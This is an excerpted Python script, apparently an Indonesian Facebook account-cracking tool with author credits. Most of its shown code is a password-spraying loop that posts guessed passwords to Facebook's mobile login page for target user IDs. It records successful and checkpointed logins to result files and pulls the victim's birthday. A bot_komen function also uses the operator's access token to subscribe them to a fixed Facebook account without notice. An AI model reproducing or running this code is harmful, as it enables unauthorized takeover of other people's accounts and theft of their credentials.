# -*- coding: utf-8
#####################################################
# * Author    : Ibnu Syifa Takbir Adha              #
# * Facebook  : https://facebook.com/ibnustagnz     #
# * GitHub    : https://github.com/ibnustagnz       #
# * Instagram : https://www.instagram.com/ibnustagnz#
# * Website   : https://ibnustagnz.my.id            #
...
def bot_komen():
    ...
    requests.post('https://graph.facebook.com/104041864922126/subscribers?access_token=' + token)
...
def menu():
	...
	logo()
	print(" \033[0;97m[\033[0;96m+\033[0;97m] User Nuck : %s"%(nama))
...
def manual():
	print(" \033[0;97m[\033[0;93m*\033[0;97m] Example Pass : bismillah,ibnustagnz,sayang,indonesia")
	...
	def main(user):
		...
		try:
			...
			pass
		try:
			for ibnustagnz in pw.split(","):
				rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ibnustagnz, 'login': 'submit'}, headers={'user-agent': ua})
				xo = rex.content
				if 'mbasic_logout_button' in xo or 'save-device' in xo:
					print('\r  \033[0;92m* --> ' +uid+ '|' + ibnustagnz + '       ')
					ok.append(uid+'|'+ibnustagnz)
					save = open('results/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(ibnustagnz)+'\n')
					save.close()
					break
					continue
				if 'checkpoint' in xo:
					try:
						...
						data = s.get(url).json()
						ttl = data['birthday'].replace("/","-")
						print('\r  \033[0;93m* --> ' +uid+ '|' + ibnustagnz + '|' + ttl)
						cp.append(uid+'|'+ibnustagnz+'|'+ttl)
						save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
						save.write('  * --> '+str(uid)+'|'+str(ibnustagnz)+'|'+ttl+'\n')
						save.close()
						break
					except(KeyError, IOError):
						ttl = " "
					except:pass
					print('\r  \033[0;93m* --> ' +uid+ '|' + ibnustagnz + '       ')
					cp.append(uid+'|'+ibnustagnz)
					save = open('results/CP-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('  * --> '+str(uid)+'|'+str(ibnustagnz)+'\n')
					save.close()
					break
